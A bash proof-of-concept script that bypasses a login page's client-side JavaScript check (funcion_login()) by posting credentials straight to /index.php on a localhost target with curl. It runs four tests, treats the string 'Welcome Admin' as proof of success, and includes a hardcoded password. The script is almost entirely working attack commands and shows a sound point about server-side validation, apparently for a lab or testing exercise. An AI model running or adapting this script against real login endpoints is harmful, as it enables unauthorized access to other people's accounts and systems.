#!/bin/bash

# Client-Side JavaScript Validation Bypass POC
# This script demonstrates bypassing the funcion_login() JavaScript validation
# by sending direct HTTP requests without executing client-side code

TARGET="http://localhost:8080"
ENDPOINT="/index.php"

echo "=========================================="
echo "Client-Side JavaScript Validation Bypass POC"
echo "=========================================="
echo "Target: $TARGET$ENDPOINT"
echo "Vulnerability: funcion_login() JavaScript validation can be bypassed"
echo ""

echo "[*] Test 1: Bypass with wrong credentials via direct POST"
echo "Command: curl -X POST $TARGET$ENDPOINT -d 'username=wronguser&password=wrongpass&login=Login'"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" -d "username=wronguser&password=wrongpass&login=Login")

if echo "$RESPONSE" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS: Authentication bypassed with wrong credentials!"
    echo "[+] Response includes: 'Welcome Admin'"
else
    echo "[-] FAILED: Did not receive success message"
fi
echo ""

echo "[*] Test 2: Bypass with minimal parameters"
echo "Command: curl -X POST $TARGET$ENDPOINT -d 'username=x&password=y&login='"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" -d "username=x&password=y&login=")

if echo "$RESPONSE" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS: Authentication bypassed with arbitrary values!"
else
    echo "[-] FAILED: Did not receive success message"
fi
echo ""

echo "[*] Test 3: Bypass by disabling JavaScript and using curl"
echo "This demonstrates that the JavaScript validation funcion_login() is NOT executed"
echo "when using a command-line HTTP client like curl"
echo "curl is JavaScript-free by default - no browser, no JS execution"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" -d "username=admin&password=sp3eder&login=Login")
if echo "$RESPONSE" | grep -q "Welcome Admin"; then
    echo "[+] SUCCESS: JavaScript validation completely bypassed"
    echo "[+] The funcion_login() function was never executed"
    echo "[+] The backend accepted the POST request without validating credentials"
else
    echo "[-] Test inconclusive"
fi
echo ""

echo "[*] Test 4: Verify the vulnerability with HEAD method to check status"
curl -I -X POST "$TARGET$ENDPOINT" -d "username=test&password=test&login=Login" 2>/dev/null | grep HTTP
echo ""

echo "=========================================="
echo "Conclusion: Client-side JavaScript validation can be completely bypassed"
echo "by submitting POST requests directly without executing JavaScript"
echo "=========================================="
